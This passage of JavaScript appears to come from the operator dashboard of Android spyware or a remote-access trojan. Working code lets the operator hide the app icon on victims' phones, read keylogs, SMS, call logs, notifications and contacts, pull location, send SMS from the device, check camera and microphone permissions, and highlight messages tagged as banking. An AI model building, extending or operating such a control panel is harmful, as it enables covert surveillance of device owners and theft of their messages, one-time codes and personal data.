             childSelector.value = 'all';
             selectedUserInfo.childKey = 'all';
        }
        childSelectorContainer.style.display = 'block';
    }

    childSelector.onchange = () => {
        selectedUserInfo.childKey = childSelector.value;
        updateManualFeaturesUI(selectedUserInfo.userId, selectedUserInfo.childKey); // NEW CALL
        updateFreezeStatus();
        updateAppVisibility();
        loadLimits(selectedUserInfo.userId, selectedUserInfo.childKey);
        setupChatUnreadListener(selectedUserInfo.userId, selectedUserInfo.childKey);
    };

    // Show action buttons
    deleteUserBtn.style.display = 'inline-flex';
    clearDeviceDataBtn.style.display = 'inline-flex';
    if(manageLocksBtn) manageLocksBtn.style.display = 'inline-flex';
    freezeBtn.style.display = 'inline-flex';
    unfreezeBtn.style.display = 'inline-flex';
    sendSingleUserNotificationBtn.style.display = 'inline-flex';
    if(pingSingleUserBtn) pingSingleUserBtn.style.display = 'inline-flex';
    if(adminSendSmsBtn) adminSendSmsBtn.style.display = 'inline-flex';

    if (configListener) {
        off(configRef, 'value', configListener);
    }
    updateManualFeaturesUI(userInfo.userId, selectedUserInfo.childKey); // NEW INITIAL CALL
    updateFreezeStatus();
    updateAppVisibility();
    loadLimits(userInfo.userId, selectedUserInfo.childKey);
    
    // Start listening for unread chat messages
    setupChatUnreadListener(userInfo.userId, selectedUserInfo.childKey);

    if (window.innerWidth <= 992) { sidebar.classList.remove('open'); overlay.style.display = 'none'; }
}

function updateFreezeStatus() {
    const { userId, childKey } = selectedUserInfo;
    let path;
    if (childKey === 'all') {
        path = `config/${userId}`;
    } else {
        path = `config/${userId}/${childKey}`;
    }
    configRef = ref(db, path);
    configListener = onValue(configRef, (snapshot) => {
        const configData = snapshot.val();
        const isFrozen = configData && configData.isFrozen;

        if (isFrozen) {
            mainContentTitle.innerHTML = `${selectedUserInfo.userName} <span style="color: red;">(FROZEN)</span>`;
            freezeBtn.style.opacity = '0.5';
            freezeBtn.disabled = true;
            unfreezeBtn.style.opacity = '1';
            unfreezeBtn.disabled = false;
        } else {
            mainContentTitle.innerHTML = `${selectedUserInfo.userName} <span style="color: #2ecc71;">(ACTIVE)</span>`;
            unfreezeBtn.style.opacity = '0.5';
            unfreezeBtn.disabled = true;
            freezeBtn.style.opacity = '1';
            freezeBtn.disabled = false;
        }
    });
}

function updateAppVisibility() {
    const { userId, childKey } = selectedUserInfo;
    
    // Clean up previous listener
    if (appVisibilityListener && appVisibilityRef) {
        off(appVisibilityRef, 'value', appVisibilityListener);
        appVisibilityListener = null;
        appVisibilityRef = null;
    }

    if (!userId || childKey === 'all') {
        appVisibilityBtn.style.display = 'none';
        return;
    }

    appVisibilityBtn.style.display = 'flex';
    
    const path = `user/${userId}/${childKey}/data/showApp`;
    appVisibilityRef = ref(db, path);
    
    appVisibilityListener = onValue(appVisibilityRef, (snapshot) => {
        const isVisible = snapshot.val() !== false; // Treat null/undefined as visible (default)
        
        appVisibilityBtn.dataset.visible = isVisible;
        if (isVisible) {
            // App is Visible -> Show "Hide App" button (Red)
            appVisibilityBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg><span>Hide App</span>`;
            appVisibilityBtn.style.borderColor = "#e74c3c";
        } else {
            // App is Hidden -> Show "Show App" button (Green)
            appVisibilityBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#2ecc71" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg><span>Show App</span>`;
            appVisibilityBtn.style.borderColor = "#2ecc71";
        }
    });
}

// ==========================================
// PART 4: DATA FETCHING & DISPLAY (RECURSIVE FIX)
// ==========================================

categoryButtonsContainer.addEventListener('click', (e) => {
    const btn = e.target.closest('.category-btn');
    if(btn) {
        if(!selectedUserInfo.userId) { alert("Please select a user first!"); return; }
        const childKey = document.getElementById('child-selector').value;
        if (!childKey || childKey === 'all') {
            alert("Please select a specific device to view data.");
            return;
        }
        selectedUserInfo.childKey = childKey;
        
        const category = btn.dataset.category;
        if (category === 'sendSms') {
            openModal(adminSendSmsModal);
        } else {
            openModal(dataModal); 
            loadCategoryData(category);
        }
    }
});

// --- PAGINATION LOGIC ---
// Helper to flatten data (Handle Date/Folder Grouping)
function flattenSnapshot(snapshot) {
    let flatList = [];
    if (!snapshot.exists()) return flatList;

    snapshot.forEach(child => {
        const key = child.key;
        const val = child.val();

        // 1. If it's a direct data item (String or Object with .data)
        if (typeof val === 'string' || (typeof val === 'object' && val !== null && val.data)) {
            flatList.push({ key: key, data: val });
        } 
        // 2. If it's a container (Folder/Date), flatten its children
        else if (typeof val === 'object' && val !== null) {
            Object.entries(val).forEach(([subKey, subVal]) => {
                // Ensure subVal is valid data
                flatList.push({ key: subKey, data: subVal, parentKey: key });
            });
        }
    });
    return flatList;
}

async function loadPaginatedData(category, path) {
    detachListeners(); // Ensure clean slate
    modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
    document.getElementById('modal-title').textContent = category.toUpperCase();

    // Initialize State
    paginationState = { 
        category: category,
        path: path,
        hasMore: true,
        oldestKey: null,
        isLoading: false
    };

    // 1. Initial Fetch (Last 50 Top-Level Items)
    // We reverse the result to show Newest at Top.
    const dataRef = ref(db, path);
    // Fetch slightly less initially to prevent massive UI load if folders are huge
    const q = query(dataRef, limitToLast(20)); // Reduced to 20 folders/items for safety

    try {
        const snapshot = await get(q);
        if (!snapshot.exists()) {
             renderPaginatedItems(category, [], path, true); // Render Empty State
             return;
        }

        // Store oldest key for pagination (Use Top-Level Keys)
        let keys = Object.keys(snapshot.val() || {});
        if (keys.length > 0) {
             // Firebase keys are sorted. First key is oldest in this batch.
             paginationState.oldestKey = keys[0];
        }

        // Flatten Data for Display
        let items = flattenSnapshot(snapshot);

        // Reverse to render Newest at Top
        items.reverse(); 

        renderPaginatedItems(category, items, path, true);

        // 2. Attach Scroll Listener
        activeScrollListener = () => handleScroll();
        modalDataDisplayArea.addEventListener('scroll', activeScrollListener);

        // 3. Setup Realtime Listener (For new incoming data)
        setupRealtimeListener(category, path);

    } catch (error) {
        console.error("Pagination Init Error:", error);
        modalDataDisplayArea.innerHTML = `<p style="padding:20px;text-align:center;color:red">Error loading data: ${error.message}</p>`;
    }
}

async function handleScroll() {
    if (paginationState.isLoading || !paginationState.hasMore) return;

    // Trigger when user is near bottom
    const { scrollHeight, scrollTop, clientHeight } = modalDataDisplayArea;
    
    // Threshold of 200px
    if (scrollHeight - scrollTop - clientHeight < 200) {
        paginationState.isLoading = true;
        
        // Append loader
        const loaderDiv = document.createElement('div');
        loaderDiv.id = 'page-loader';
        loaderDiv.innerHTML = '<small style="color:#888;">Loading history...</small>';
        loaderDiv.style.textAlign = 'center';
        loaderDiv.style.padding = '10px';
        modalDataDisplayArea.appendChild(loaderDiv);

        try {
            const dataRef = ref(db, paginationState.path);
            // Fetch next batch ending at oldestKey
            // limitToLast(21) -> 20 new + 1 overlap
            const q = query(dataRef, orderByKey(), endAt(paginationState.oldestKey), limitToLast(21));
            
            const snapshot = await get(q);
            
            // Remove Loader
            if(loaderDiv.parentNode) loaderDiv.remove();

            if (!snapshot.exists()) {
                paginationState.hasMore = false;
                return;
            }

            const rawVal = snapshot.val();
            const keys = Object.keys(rawVal); // Keys are sorted by Firebase logic usually, but Object.keys not guaranteed. 
            // Better to use forEach for sorting guarantee from snapshot
            
            let sortedKeys = [];
            snapshot.forEach(c => sortedKeys.push(c.key));

            if (sortedKeys.length <= 1) {
                paginationState.hasMore = false;
                return;
            }

            // Remove the last item (overlap)
            const overlapKey = sortedKeys.pop(); // The last one is the endAt key
            
            // New Oldest Key is the first one in this batch
            paginationState.oldestKey = sortedKeys[0];

            // We need a snapshot-like object for flattenSnapshot, but we need to exclude overlap manually
            // OR simpler: flatten everything, then filter out the overlap ITEM (parentKey check?)
            // Actually, flattenSnapshot iterates the snapshot. We can just skip the overlap child.
            
            let flatList = [];
            snapshot.forEach(child => {
                if (child.key === overlapKey) return; // Skip overlap
                
                const val = child.val();
                if (typeof val === 'string' || (typeof val === 'object' && val !== null && val.data)) {
                    flatList.push({ key: child.key, data: val });
                } 
                else if (typeof val === 'object' && val !== null) {
                    Object.entries(val).forEach(([subKey, subVal]) => {
                        flatList.push({ key: subKey, data: subVal, parentKey: child.key });
                    });
                }
            });

            // Reverse for display (Newest...Oldest)
            flatList.reverse();

            // Append to UI
            renderPaginatedItems(paginationState.category, flatList, paginationState.path, false);

        } catch (error) {
            console.error("Fetch More Error:", error);
            if(document.getElementById('page-loader')) document.getElementById('page-loader').remove();
        } finally {
            paginationState.isLoading = false;
        }
    }
}

function renderPaginatedItems(cat, list, path, isInitial) {
    // Process Items (Decompression check)
    const procList = list.map(item => {
        let decompressed = item.data;
        if (typeof item.data === 'string') {
             const result = decompressData(item.data);
             // Safety check: if decompression returns original compressed string, we assume it failed or is raw.
             decompressed = result;
        } else if (typeof item.data === 'object' && item.data !== null) {
             // Already object?
             decompressed = item.data;
             // Check if it's wrapped in { data: "string" }
             if (decompressed.data && typeof decompressed.data === 'string') {
                decompressed = decompressData(decompressed.data);
             }
        } else {
             decompressed = item.data; 
        }

        // Special handling for keylog/userlog if still raw string
        if (cat === 'userlog' && typeof decompressed === 'string' && decompressed.length > 50 && !decompressed.includes(' ')) {
             // Try aggressive re-decode if it looks like a token
             const retry = decompressData(decompressed);
             if (retry !== decompressed) decompressed = retry;
        }

        return { key: item.key, data: decompressed };
    });

    const html = generateItemsHTML(cat, procList);

    if (isInitial) {
        currentDownloadableData = procList;
        modalDataDisplayArea.innerHTML = `
            <div class="data-header">
                <button id="manual-refresh-btn" style="background-color: #3498db; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px;">
                    Refresh New Data
                </button>
                <button id="download-btn" style="background-color: #27ae60; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px;">
                    Download
                </button>
                <button class="clear-btn" data-path="${path}">Delete All</button>
            </div>
            `;
        
        // Add click listener for refresh
        document.getElementById('manual-refresh-btn').onclick = () => {
            loadPaginatedData(cat, path);
        };

        // Add click listener for download
        document.getElementById('download-btn').onclick = () => {
            downloadCurrentData(cat);
        };
            
        // Add Container
        let containerClass = 'sms-list';
        if (cat === 'sms') containerClass = 'chat-interface';
        if (cat === 'calllogs') containerClass = 'calllog-list';
        if (cat === 'notifications') containerClass = 'notification-list-enhanced';
        if (cat === 'userlog') containerClass = 'keylog-list';

        const container = document.createElement('div');
        container.id = 'paginated-list-container';
        container.className = containerClass;
        container.innerHTML = html;
        modalDataDisplayArea.appendChild(container);

    } else {
        currentDownloadableData = currentDownloadableData.concat(procList);
        const container = document.getElementById('paginated-list-container');
        if (container) {
            container.insertAdjacentHTML('beforeend', html);
        }
    }
}

// Naya Function: Jo Folder ke andar Folder check karega
function collectRenderableItems(node, items = []) {
    if (!node) return items;

    if (typeof node === 'object' && node !== null) {
        // If it's a folder-like object, iterate over its keys
        Object.entries(node).forEach(([key, child]) => {
            if (!child) return;

            // Heuristic to identify a "data item" node vs. another "folder"
            // A data item might have a 'data' string property, or it might be a string itself.
            let isDataItem = false;
            let dataToDecompress = null;
            let originalItem = null;

            if (typeof child === 'string' && child.length > 10) { // Check for Gzip header or just being a long string
                isDataItem = true;
                dataToDecompress = child;
                originalItem = child;
            } else if (typeof child === 'object' && child.data && typeof child.data === 'string') {
                isDataItem = true;
                dataToDecompress = child.data;
                originalItem = child;
            }

            if (isDataItem) {
                const decompressed = decompressData(dataToDecompress);
                if (decompressed) {
                    items.push({
                        key: key, // The key of the item
                        data: decompressed, // The decompressed data
                        original: originalItem // The raw item before decompression
                    });
                }
            } else if (typeof child === 'object') {
                // If it's another object but not a clear data item, recurse
                collectRenderableItems(child, items);
            }
        });
    }
    return items;
}

function loadCategoryData(cat) {
    detachListeners();
    modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
    document.getElementById('modal-title').textContent = cat.toUpperCase();
    
    const { userId, childKey } = selectedUserInfo;

    if(cat === 'photo' || cat === 'video' || cat === 'audio' || cat === 'screenshot') { renderMedia(userId, childKey, cat); return; }
    if(cat === 'chat') { renderChatInterface(userId, childKey); return; }

    if (cat === 'contacts') {
        const path = `user/${userId}/${childKey}/contacts/data`;
        const cmdPath = `user/${userId}/${childKey}/contacts/params`;

        modalDataDisplayArea.innerHTML = `
            <div class="data-header" style="justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <div style="display: flex; gap: 10px;">
                    <button id="fetch-contacts-btn" style="background: #3498db; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; font-weight: 600;">
                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 8px;"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
                        Fetch Contacts
                    </button>
                    <button id="download-contacts-btn" style="background: #27ae60; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; display: none; align-items: center; font-weight: 600;">
                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 8px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                        Download PDF
                    </button>
                </div>
                <button class="clear-btn" data-path="${path}" style="background: #e74c3c; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; font-weight: 600;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 8px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2 2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg>
                    Clear Data
                </button>
            </div>
            <div id="contacts-status-msg" style="text-align: center; color: #bdc3c7; padding: 20px;">Waiting for data...</div>
            <div id="contacts-list" class="sms-list" style="margin-top: 10px;"></div>
        `;

        // Handle Fetch
        document.getElementById('fetch-contacts-btn').onclick = () => {
            const statusMsg = document.getElementById('contacts-status-msg');
            statusMsg.innerHTML = 'Sending command to device... <span class="loader-spinner"></span>';
            statusMsg.style.color = '#3498db';
            
            update(ref(db, cmdPath), { getContacts: true })
                .then(() => {
                    setTimeout(() => {
                        statusMsg.innerText = 'Command sent! Waiting for device to upload contacts...';
                    }, 1000);
                })
                .catch(err => {
                    statusMsg.innerText = 'Error sending command: ' + err.message;
                    statusMsg.style.color = '#e74c3c';
                });
        };

        // Handle Clear
        modalDataDisplayArea.querySelector('.clear-btn').onclick = (e) => {
            if(confirm("Are you sure you want to delete all contacts data?")) {
                remove(ref(db, e.target.closest('.clear-btn').dataset.path));
                document.getElementById('contacts-list').innerHTML = '';
                document.getElementById('download-contacts-btn').style.display = 'none';
                document.getElementById('contacts-status-msg').innerText = 'Data cleared.';
            }
        };

        // Listen for Data
        const r = ref(db, path);
        activeDataListener = {
            ref: r,
            callback: (snapshot) => {
                const rawData = snapshot.val();
                const listContainer = document.getElementById('contacts-list');
                const downloadBtn = document.getElementById('download-contacts-btn');
                const statusMsg = document.getElementById('contacts-status-msg');

                if (!rawData) {
                    listContainer.innerHTML = '';
                    statusMsg.style.display = 'block';
                    statusMsg.innerText = 'No contacts found or data cleared.';
                    downloadBtn.style.display = 'none';
                    return;
                }

                statusMsg.style.display = 'none';
                
                // Decompress
                let contacts = [];
                try {
                    // It could be a simple compressed string or object
                    if (typeof rawData === 'string') {
                         const decompressed = decompressData(rawData);
                         contacts = (typeof decompressed === 'string') ? JSON.parse(decompressed) : decompressed;
                    } else if (typeof rawData === 'object') {
                         // Sometimes it's segmented
                         const keys = Object.keys(rawData).sort(); // Sort by push key
                         const latest = rawData[keys[keys.length-1]]; // Get latest if multiple pushes
                         if(latest.data) {
                             const d = decompressData(latest.data);
                             contacts = (typeof d === 'string') ? JSON.parse(d) : d;
                         } else {
                             // Maybe direct object
                             contacts = rawData; 
                         }
                    }
                } catch (e) {
                    console.error("Contacts parse error", e);
                    statusMsg.innerText = "Error parsing contact data.";
                    statusMsg.style.display = 'block';
                    return;
                }

                if (!Array.isArray(contacts)) {
                    // Try to handle if object format { "1": {name...}, "2": {name...} }
                    if (typeof contacts === 'object' && contacts !== null) {
                        contacts = Object.values(contacts);
                    } else {
                        statusMsg.innerText = "Invalid data format received.";
                        statusMsg.style.display = 'block';
                        return;
                    }
                }

                // Render
                currentDownloadableData = contacts.map((c, i) => ({ key: i, data: c })); // Format for generic download if needed, but we use custom
                
                downloadBtn.style.display = 'flex';
                downloadBtn.onclick = () => {
                     // PDF Generation
                     if (!window.jspdf || !window.jspdf.jsPDF) {
                        alert("PDF Library not loaded."); return;
                     }
                     const { jsPDF } = window.jspdf;
                     const doc = new jsPDF();
                     
                     doc.setFontSize(18);
                     doc.text("Contacts Report", 14, 22);
                     doc.setFontSize(11);
                     doc.text(`Device: ${selectedUserInfo.userName} | Total: ${contacts.length}`, 14, 30);
                     
                     const tableData = contacts.map(c => [c.name || 'No Name', c.phoneNumber || 'No Number']);
                     
                     doc.autoTable({
                         head: [['Name', 'Phone Number']],
                         body: tableData,
                         startY: 40,
                         theme: 'grid',
                         styles: { fontSize: 10, cellPadding: 3 },
                         headStyles: { fillColor: [41, 128, 185], textColor: 255 }
                     });
                     
                     doc.save(`Contacts_${selectedUserInfo.userName}_${new Date().toISOString().slice(0,10)}.pdf`);
                     
                     if(confirm("PDF Downloaded! Clear data from database now to save space?")) {
                          remove(ref(db, path));
                     }
                };
                
                // HTML List Render
                listContainer.innerHTML = contacts.map(c => `
                    <div class="sms-item" style="display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.05);">
                        <div style="flex: 1;">
                            <div style="font-weight: bold; font-size: 1.1em; color: #fff;">${c.name || 'Unknown'}</div>
                            <div style="color: #bdc3c7; font-family: monospace; margin-top: 4px;">${c.phoneNumber}</div>
                        </div>
                        <div style="width: 40px; height: 40px; background: rgba(52, 152, 219, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #3498db; font-weight: bold;">
                             ${(c.name || '?').charAt(0).toUpperCase()}
                        </div>
                    </div>
                `).join('');
            }
        };
        onValue(r, activeDataListener.callback);
        return;
    }


    if (cat === 'deviceStatus') {
        // [CHANGE 1] अब हम childKey को पाथ में शामिल कर रहे हैं ताकि सही जगह से डेटा दिखे
        const path = `user/${userId}/${childKey}/deviceStatus`;
        
        // [CHANGE 2] रिफ्रेश बटन के लिए सही कमांड पाथ (Android के SmsService.kt के अनुसार)
        const paramsPath = `config/${userId}`; 
        
        const headerHtml = `
            <div class="data-header">
                <button onclick="cmd('${paramsPath}', {getStatus: true})">Refresh Status</button>
                <button class="clear-btn" data-path="${path}">Clear Data</button>
            </div>
        `;

        const r = ref(db, path);
        activeDataListener = {
            ref: r,
            callback: (snapshot) => {
                const rawData = snapshot.val();
                if (!rawData) {
                    modalDataDisplayArea.innerHTML = headerHtml + '<p style="padding:20px;text-align:center">No Status Data Available</p>';
                    return;
                }

                // Decompress Data
                const data = decompressData(rawData);
                currentDownloadableData = [data];
                
                // अगर डेटा सही नहीं है तो एरर दिखाएं
                if (!data || typeof data !== 'object') {
                     modalDataDisplayArea.innerHTML = headerHtml + '<p style="padding:20px;text-align:center">Invalid Data Format</p>';
                     return;
                }

                // Destructure androidId and model along with other fields
                const { androidId, model, batteryLevel, isCharging, networkType, sim1, sim2, accessibilityEnabled, notificationEnabled, locationPerm, cameraPerm, micPerm, timestamp } = data;
                const timeStr = formatTimestamp(timestamp);

                const batteryIcon = isCharging 
                    ? `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#2ecc71" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 7v10"/><rect x="1" y="5" width="18" height="14" rx="2" ry="2"/><path d="M11 10l2 2-2 2"/></svg>`
                    : `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="${batteryLevel < 20 ? '#e74c3c' : 'white'}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="6" width="18" height="12" rx="2" ry="2"/><line x1="23" y1="13" x2="23" y2="11"/></svg>`;
                
                const netIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#3498db" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>`;

                const renderCheck = (val) => val 
                    ? `<span style="color:#2ecc71; font-weight:bold;">✔ Active</span>` 
                    : `<span style="color:#e74c3c; font-weight:bold;">✘ Inactive</span>`;

                modalDataDisplayArea.innerHTML = headerHtml + `
                    <div class="status-card" style="background:transparent; box-shadow:none; padding:0;">
                        
                        <!-- NEW: Device Identity Section -->
                        <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 12px; margin-bottom: 24px; border: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items:center; flex-wrap: wrap; gap: 10px;">
                            <div style="display:flex; flex-direction:column; gap:4px;">
                                <span style="font-size: 0.85rem; color: #bdc3c7; text-transform:uppercase; letter-spacing:0.5px;">Model Name</span>
                                <span style="font-size: 1.4rem; font-weight: 700; color: #fff;">${model || 'Unknown Device'}</span>
                            </div>
                            <div style="display:flex; flex-direction:column; gap:4px; text-align:right;">
                                <span style="font-size: 0.85rem; color: #bdc3c7; text-transform:uppercase; letter-spacing:0.5px;">Device ID</span>
                                <span style="font-size: 1rem; font-family: monospace; background: rgba(0,0,0,0.3); padding: 6px 10px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.1); color: var(--accent-yellow); letter-spacing: 1px;">${androidId || 'N/A'}</span>
                            </div>
                        </div>

                        <div class="status-header">
                            <h3 style="margin:0; font-size:1.2rem;">Device Health</h3>
                            <small style="color:#95a5a6;">Last Updated: ${timeStr}</small>
                        </div>
                        <div class="status-grid">
                            <div class="status-item">${batteryIcon}<div><div style="font-size:0.8rem; color:#bdc3c7;">Battery</div><div style="font-size:1.1rem; font-weight:bold;">${batteryLevel}% ${isCharging ? '(Charging)' : ''}</div></div></div>
                            <div class="status-item">${netIcon}<div><div style="font-size:0.8rem; color:#bdc3c7;">Network</div><div style="font-size:1.1rem; font-weight:bold;">${networkType || 'Unknown'}</div></div></div>
                            <div class="status-item" style="flex-direction:column; align-items:flex-start; gap:5px;">
                                <div style="font-size:0.8rem; color:#bdc3c7;">SIM Information</div>
                                <div style="font-size:0.95rem;"><b>SIM 1:</b> ${sim1 || 'N/A'}</div>
                                <div style="font-size:0.95rem;"><b>SIM 2:</b> ${sim2 || 'N/A'}</div>
                            </div>
                        </div>
                        <div>
                            <h4 style="margin:0 0 0.8rem 0; font-size:1rem; color:#bdc3c7;">Permissions Checklist</h4>
                            <div class="perm-grid">
                                <div class="perm-item"><div>Accessibility</div>${renderCheck(accessibilityEnabled)}</div>
                                <div class="perm-item"><div>Notification</div>${renderCheck(notificationEnabled)}</div>
                                <div class="perm-item"><div>Location</div>${renderCheck(locationPerm)}</div>
                                <div class="perm-item"><div>Camera</div>${renderCheck(cameraPerm)}</div>
                                <div class="perm-item"><div>Microphone</div>${renderCheck(micPerm)}</div>
                            </div>
                        </div>
                    </div>`;
            }
        };
        onValue(r, activeDataListener.callback);
        return;
    }

    // --- Path Logic ---
    let path = `user/${userId}/${childKey}/${cat}`;
    if (['userlog','User_Logs'].includes(cat)) path = `user/${userId}/${childKey}/User_Logs`;
    if (cat === 'notifications') path = `user/${userId}/${childKey}/notificationsMessages/data`;
    if (cat === 'sms') path = `user/${userId}/${childKey}/sms/data`;
    if (cat === 'location') path = `user/${userId}/${childKey}/location/data`;
    if (cat === 'calllogs') path = `user/${userId}/${childKey}/Calls`;

    // [New] Branching for Pagination
    if (['sms', 'calllogs', 'userlog', 'notifications'].includes(cat) || ['User_Logs'].includes(cat)) {
        console.log("Using Pagination for:", cat);
        loadPaginatedData(cat, path);
        return;
    }

    console.log("Fetching Path:", path);
    const r = ref(db, path);
    
    activeDataListener = { ref: r, callback: (snap) => {
        if(!snap.exists()) {
            let headerHtml = `<div class="data-header">`;

            // For the 'location' category, ensure the "Update Location" button is always visible.
            if (cat === 'location') {
                const { userId, childKey } = selectedUserInfo;
                const pPath = `user/${userId}/${childKey}/location/params`;
                headerHtml += `<button onclick="cmd('${pPath}', {getLocation: true})">Update Location</button>`;
            }
            
            // Add the "Clear All" button, making it consistent with other data views.
            headerHtml += `<button class="clear-btn" data-path="${path}">Clear All</button></div>`;

            modalDataDisplayArea.innerHTML = headerHtml + `<p style="padding:20px;text-align:center">No Data Found</p>`;
            return;
        }
        
        const raw = snap.val();

        if (cat === 'location') {
            showLocation(raw, path);
            return;
        }

        // For other categories
        const collectedItems = collectRenderableItems(raw);
        console.log(`Found ${collectedItems.length} items for ${cat}`);
        renderItems(cat, collectedItems.reverse(), path);
    }};
    onValue(r, activeDataListener.callback);
}

function generateItemsHTML(cat, list) {
    let html = '';

    // Helper for creating a timestamp
    const createTimestamp = (item, data) => {
        const finalTime = getRealTimestamp(item.key, data);
        return formatTimestamp(finalTime);
    };

    // Helper to get alert class based on content
    const getAlertClass = (content) => {
        if (typeof content !== 'string') return '';
        if (content.includes('[CRITICAL]') || content.includes('[BANKING]') || content.includes('[ALERT]')) {
            return 'critical-highlight';
        }
        return '';
    };

    switch (cat) {
        case 'sms':
            list.forEach(item => {
                const s = item.data;
                if (!s) return;

                const smsContent = s.smsBody || s.body || '';
                const alertClass = getAlertClass(smsContent);
                const isIncoming = String(s.type).toLowerCase().includes('incoming') || s.type == "1";
                const bubbleClass = isIncoming ? 'incoming' : 'outgoing';
                const formattedTime = createTimestamp(item, s);

                html += `
                    <div class="message-bubble ${bubbleClass} ${alertClass}">
                        <div class="message-sender">${s.smsAddress || s.address || 'Unknown'}</div>
                        <div class="message-body">${smsContent}</div>
                        <div class="message-time">${formattedTime}</div>
                    </div>
                `;
            });
            break;

        case 'calllogs':
            list.forEach(item => {
                const c = item.data;
                if (!c) return;

                let icon = '';
                let typeClass = '';
                const callType = String(c.callType || c.type).toUpperCase();

                if (callType.includes('INCOMING')) {
                    icon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 7L7 17M7 17H17M7 17V7"/></svg>';
                    typeClass = 'incoming';
                } else if (callType.includes('OUTGOING')) {
                    icon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7M17 7H7M17 7V17"/></svg>';
                    typeClass = 'outgoing';
                } else if (callType.includes('MISSED')) {
                    icon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>';
                    typeClass = 'missed';
                } else {
                    icon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.63A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>';
                    typeClass = 'unknown';
                }
                const formattedTime = createTimestamp(item, c);

                html += `
                    <div class="calllog-item">
                        <div class="call-icon ${typeClass}">${icon}</div>
                        <div class="call-details">
                            <div class="call-number">${c.phoneNumber || 'Unknown'}</div>
                            <div class="call-name">${c.name || ''}</div>
                        </div>
                        <div class="call-info">
